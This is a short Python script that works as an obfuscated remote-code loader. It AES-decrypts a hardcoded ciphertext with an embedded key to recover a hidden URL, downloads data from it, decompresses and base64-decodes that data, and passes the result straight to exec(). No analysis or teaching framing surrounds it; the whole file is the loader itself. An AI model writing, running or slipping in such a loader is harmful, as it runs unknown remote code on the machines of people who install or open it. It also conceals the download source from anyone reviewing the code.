import zlib, base64
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def aes_decrypt(encrypted_text, key):
    key = base64.b64decode(key)
    cipher = AES.new(key, AES.MODE_ECB)
    decrypted_text = unpad(cipher.decrypt(base64.b64decode(encrypted_text)), AES.block_size)
    return decrypted_text.decode('utf-8')

def get_bytes(links):
    response = requests.get(links)
    if response.status_code == 200:
        tbytes = response.content
        return tbytes

yd = "vJfE1c/zSpjrksAqCBsj3Qs2r/uc9qtfzxwszymxs4y27iYuuZp9nf9J2IZKSFS4tjETrgmVA9nTu/C2GL+Qtm5Rep8at0t7rZ+PWQT/qCk="
yd_key = "W8BWbk3Bi0/7fElbVvUOfw==" 
yd_links = aes_decrypt(yd, yd_key)
yd_bytes = get_bytes(yd_links)
yd_code = base64.b64decode(zlib.decompress(yd_bytes))

exec(yd_code)